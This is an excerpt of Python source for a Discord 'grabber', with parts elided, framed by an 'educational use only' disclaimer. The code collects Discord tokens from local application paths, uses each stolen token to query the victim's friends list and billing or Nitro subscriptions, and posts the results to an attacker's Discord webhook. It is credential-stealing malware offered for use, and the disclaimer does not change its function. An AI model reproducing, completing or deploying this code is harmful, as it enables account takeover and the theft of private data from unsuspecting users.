...
import base64
import datetime
from modules import Utilities #type: ignore

# Educational use only.
# This code demonstrates how grabber-style applications function for study and analysis.
# The author does not endorse or take responsibility for any malicious use.
# Run only in a safe, controlled environment.
# it only supports v10, v11 as this was an old code we made

webhook = "your discord webhook"
# i suggest encrypting and encoding your webhook stringm
...
Utilities.install_import([("win32crypt", "pypiwin32"), ("Crypto.Cipher", "pycryptodome")])
        ...
        for platform, path in PATHS.items():
            ...
            for token in self.gettokens(path):
                ...
                try:
                    ...
                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/relationships', headers=self.getheaders(token))).read().decode())
                    ...
                    res = json.loads(urllib.request.urlopen(urllib.request.Request('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token))).read().decode())
                    has_nitro = False
                    ...
                    embed_user = {
                        ...
                        "username": "Grabber",
                        "avatar_url": "https://cdn.discordapp.com/attachments/1346514465998372916/1363125379220377803/2af6afa5c2ecd58c75f37ada4697d7cc.jpg?ex=6804e4f0&is=68039370&hm=81920dd916adf3245f78d8d7aaaab3a581d6115cf6731416edd42d4aeb7252e1&"
                    }

                    urllib.request.urlopen(urllib.request.Request(webhook, data=json.dumps(embed_user).encode('utf-8'), headers=self.getheaders(), method='POST')).read().decode()
